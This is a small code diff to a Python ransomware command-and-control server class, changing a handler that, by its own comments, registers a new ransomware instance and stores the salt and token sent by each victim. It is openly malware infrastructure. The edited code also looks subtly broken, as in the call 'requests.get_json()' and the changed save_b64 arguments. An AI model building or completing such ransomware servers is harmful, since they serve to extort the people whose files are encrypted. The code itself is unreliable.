@@ -20,12 +20,13 @@ class CNC(CNCBase):
 
     def post_new(self, path:str, params:dict, body:dict)->dict:
         # used to register new ransomware instance
-        path = os.path.join(CNC.ROOT_PATH, params["token"])
+        # path is the url path
+        # params is the url params
+        # body is the json body
         token = params["token"]
         salt = params["salt"]
-        key = params["key"]
-        self.save_b64(token, salt, "salt.bin")
-        self.save_b64(token, key, "key.bin")
+        self.save_b64(salt, "salt.bin")
+        self.save_b64(token, "token.bin")
         # the body contain the payload send by the victim
         body = requests.get_json()
         return {"status": "ok"}
